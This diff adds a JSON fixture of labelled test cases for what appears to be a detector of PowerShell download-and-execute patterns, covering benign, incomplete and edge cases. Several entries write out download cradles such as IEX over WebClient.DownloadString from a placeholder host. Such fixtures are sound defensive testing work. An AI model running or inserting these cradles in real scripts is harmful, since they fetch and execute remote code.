@@ -1,0 +1,86 @@
+[
+  {
+    "id": "high_direct",
+    "category": "malicious_pattern",
+    "script": "IEX ((New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1'))",
+    "expected": "download_and_execute"
+  },
+  {
+    "id": "high_pipe",
+    "category": "malicious_pattern",
+    "script": "(Invoke-WebRequest -Uri 'https://payload.invalid/demo.ps1').Content | IEX",
+    "expected": "download_and_execute"
+  },
+  {
+    "id": "high_variable",
+    "category": "malicious_pattern",
+    "script": "$s=(New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1'); Invoke-Expression $s",
+    "expected": "download_and_execute"
+  },
+  {
+    "id": "medium_download",
+    "category": "suspicious_pattern",
+    "script": "(New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1')",
+    "expected": "download_only"
+  },
+  {
+    "id": "medium_request",
+    "category": "suspicious_pattern",
+    "script": "Invoke-WebRequest -Uri 'https://payload.invalid/demo.ps1'",
+    "expected": "download_only"
+  },
+  {
+    "id": "medium_assignment",
+    "category": "suspicious_pattern",
+    "script": "$s=(Invoke-WebRequest -Uri 'https://payload.invalid/demo.ps1').Content",
+    "expected": "download_only"
+  },
+  {
+    "id": "benign_output",
+    "category": "benign",
+    "script": "Write-Output 'hello'",
+    "expected": "no_download"
+  },
+  {
+    "id": "benign_quoted_keywords",
+    "category": "benign",
+    "script": "Write-Output 'DownloadString IEX'",
+    "expected": "no_download"
+  },
+  {
+    "id": "benign_comment",
+    "category": "benign",
+    "script": "# Invoke-WebRequest IEX",
+    "expected": "no_download"
+  },
+  {
+    "id": "incomplete",
+    "category": "incomplete",
+    "script": "IEX ((New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1')",
+    "expected": "unknown"
+  },
+  {
+    "id": "unrelated_variable",
+    "category": "incomplete",
+    "script": "$a=(New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1'); IEX $b",
+    "expected": "unknown"
+  },
+  {
+    "id": "dynamic_string",
+    "category": "unsupported",
+    "script": "Invoke-WebRequest -Uri \"https://$host/demo\"",
+    "expected": "unknown"
+  },
+  {
+    "id": "local_iex",
+    "category": "unsupported",
+    "script": "IEX 'Write-Output hello'",
+    "expected": "unknown"
+  },
+  {
+    "id": "legitimate_automation",
+    "category": "false_positive",
+    "script": "IEX ((New-Object System.Net.WebClient).DownloadString('https://approved.example.invalid/demo.ps1'))",
+    "expected": "download_and_execute"
+  }
+]
